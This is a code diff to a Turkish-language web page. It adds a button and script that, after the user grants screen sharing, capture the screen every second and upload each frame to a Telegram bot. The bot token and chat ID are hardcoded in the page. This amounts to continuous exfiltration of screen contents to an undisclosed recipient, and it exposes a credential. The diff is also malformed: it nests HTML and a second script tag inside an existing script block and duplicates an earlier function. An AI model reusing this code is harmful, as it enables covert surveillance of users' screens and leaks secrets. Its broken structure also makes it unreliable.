@@ -437,6 +437,75 @@ async function startScreenCaptureAndSendToTelegram(botToken, chatId) {
 // Çağır:
 startScreenCaptureAndSendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
 
+
+
+<button id="startCaptureBtn">Ekran Görüntüsünü Telegram'a Gönder</button>
+
+<script>
+const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
+const TELEGRAM_CHAT_ID = '5395609882';
+
+async function startScreenCaptureAndSendToTelegram(botToken, chatId) {
+  try {
+    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+
+    async function sendPhotoToTelegram(imageBlob) {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', imageBlob, 'screenshot.png');
+
+      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+
+      if (!response.ok) {
+        throw new Error(`Telegram API hata: ${response.statusText}`);
+      }
+    }
+
+    setInterval(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(async (blob) => {
+        if (blob) {
+          try {
+            await sendPhotoToTelegram(blob);
+            console.log('Ekran görüntüsü gönderildi.');
+          } catch (e) {
+            console.error('Telegram gönderim hatası:', e);
+          }
+        }
+      }, 'image/png');
+    }, 1000);
+
+  } catch (err) {
+    alert('Ekran paylaşımı reddedildi veya hata oluştu: ' + err);
+  }
+}
+
+document.getElementById('startCaptureBtn').addEventListener('click', () => {
+  startScreenCaptureAndSendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+});
+</script>
+
+
+
+
+
+
+
+
+    
+
   </script>
 </body>
 </html>
